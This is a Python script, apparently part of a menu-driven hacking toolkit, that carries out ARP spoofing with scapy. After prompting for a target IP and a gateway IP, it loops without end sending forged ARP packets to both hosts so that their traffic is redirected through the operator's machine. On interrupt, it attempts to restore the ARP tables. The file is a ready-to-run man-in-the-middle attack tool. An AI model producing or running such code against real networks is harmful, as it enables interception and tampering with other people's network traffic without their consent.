from Settings.Utils import *
from Settings.Config import *

print(banner)

try:
    import time
    import scapy.all as scapy
except ImportError:
    module_error()
    exit()

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    ether = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp = scapy.ARP(op=1, pdst=target_ip, psrc=spoof_ip)

    packet = ether/arp

    scapy.sendp(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)

    ether = scapy.Ether(dst=destination_mac)

    arp = scapy.ARP(op=1, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)

    packet = ether/arp
    scapy.sendp(packet, verbose=False)

def arp_spoof(target_ip, gateway_ip):
    try:
        sent_packets_count = 0
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            sent_packets_count += 2
            print(f"\r[{green}+{reset}] Packets sent: {sent_packets_count}", end="")
            time.sleep(2)
    except KeyboardInterrupt:
        print(f"\n[{red}+{reset}] Detected CTRL + C... Resetting ARP tables... Please wait.")
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)
        print(f"[{green}+{reset}] ARP tables restored.")
        print(f"[{green}+{reset}] Exiting...")
        time.sleep(2)
        clear()
        return
    
def arp_spoof_menu():
    print(f"""{red}
                                                                ========================================
                                                                |{green}             ARP Spoofing             {red}|
                                                                ========================================          
    
Be sure targets are on the same network as you. ARP Spoofing only works locally.
    {reset}""")
    
    target_ip = input(f"{red}[{green}+{red}]{white} Enter the target IP address (or Q to quit): {reset}")

    if target_ip == "Q" or target_ip == "q":
        return
    
    gateway_ip = input(f"{red}[{green}+{red}]{white} Enter the gateway IP address: {reset}")



    
    print(f"{red}[{green}+{red}]{white} ARP spoofing target {target_ip} on the network...{reset}")
    arp_spoof(target_ip, gateway_ip)
    
    input(f"{red}[{green}+{red}]{white} Press Enter to return to the main menu...{reset}")
    return

arp_spoof_menu()

